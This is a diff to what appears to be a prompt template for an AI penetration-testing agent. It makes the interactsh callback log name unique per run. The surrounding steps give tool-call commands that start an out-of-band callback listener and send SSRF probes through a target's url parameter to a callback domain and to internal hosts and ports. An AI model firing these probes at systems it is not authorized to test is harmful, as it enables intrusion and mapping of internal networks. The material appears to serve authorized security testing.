@@ -84,9 +84,11 @@ Build a TodoWrite list of candidate sinks ranked by reachability.
 
 Before any internal probe, ensure you can detect blind egress. This is the foundation for confidence scoring later.
 
+Replace `RUN` with a short random token you pick once for this workflow (for example the output of `openssl rand -hex 4`) and reuse it in every file name: all your chats share your sandbox's `/tmp`, so a fixed name would read another chat's callbacks as this one's.
+
 ```
-kali_shell({{"command": "interactsh-client -server {ssrf_oob_provider} -json -v > /tmp/interactsh.log 2>&1 & echo $!"}})
-kali_shell({{"command": "sleep 5 && head -20 /tmp/interactsh.log"}})
+kali_shell({{"command": "interactsh-client -server {ssrf_oob_provider} -json -v > /tmp/interactsh-RUN.log 2>&1 & echo $!"}})
+kali_shell({{"command": "sleep 5 && head -20 /tmp/interactsh-RUN.log"}})
 ```
 
 **Save the PID** for later cleanup. Read the registered `.{ssrf_oob_provider}` domain from the log - random strings will NOT work, the domain is cryptographically registered with the server.
@@ -95,7 +97,7 @@ Send a baseline external callback to confirm the sink fetches at all:
 
 ```
 execute_curl({{"args": "-s --max-time {ssrf_request_timeout} 'https://TARGET/fetch?url=https://REGISTERED_DOMAIN/ssrf-oracle'"}})
-kali_shell({{"command": "tail -20 /tmp/interactsh.log"}})
+kali_shell({{"command": "tail -20 /tmp/interactsh-RUN.log"}})
 ```
 
 If the callback fires, you have a confirmed-egress oracle. If it does not fire, the sink either does not fetch or egress is blocked. Try alternative parameter names from Step 1 before assuming the sink is dead.
@@ -221,7 +223,7 @@ Then a human summary including: dominant pattern, hardened components, remediati
 
 ```
 kali_shell({{"command": "kill SAVED_INTERACTSH_PID 2>/dev/null"}})
-kali_shell({{"command": "rm -f /tmp/interactsh.log"}})
+kali_shell({{"command": "rm -f /tmp/interactsh-RUN.log"}})
 ```
 
 Set `action='complete'` with the captured findings.
@@ -316,7 +318,7 @@ After Step 2 of the main workflow registered an OAST domain, send one probe per 
 
 ```
 execute_curl({"args": "-s --max-time 10 'https://TARGET/fetch?url=http://internal-host:PORT/' &"})
-kali_shell({"command": "tail -50 /tmp/interactsh.log"})
+kali_shell({"command": "tail -50 /tmp/interactsh-RUN.log"})
 ```
 
 Internal hosts that the sink reaches but cannot resolve will produce DNS-only callbacks if the SSRF runs through a local resolver pointed at an attacker-controlled domain. Use:
@@ -355,7 +357,7 @@ A consistent length-differential across runs is a Medium-confidence reachability
 
 ---
 
-**Cleanup:** kill the interactsh PID and remove `/tmp/interactsh.log` at the end of the engagement.
+**Cleanup:** kill the interactsh PID and remove `/tmp/interactsh-RUN.log` at the end of the engagement.
 """
 
 
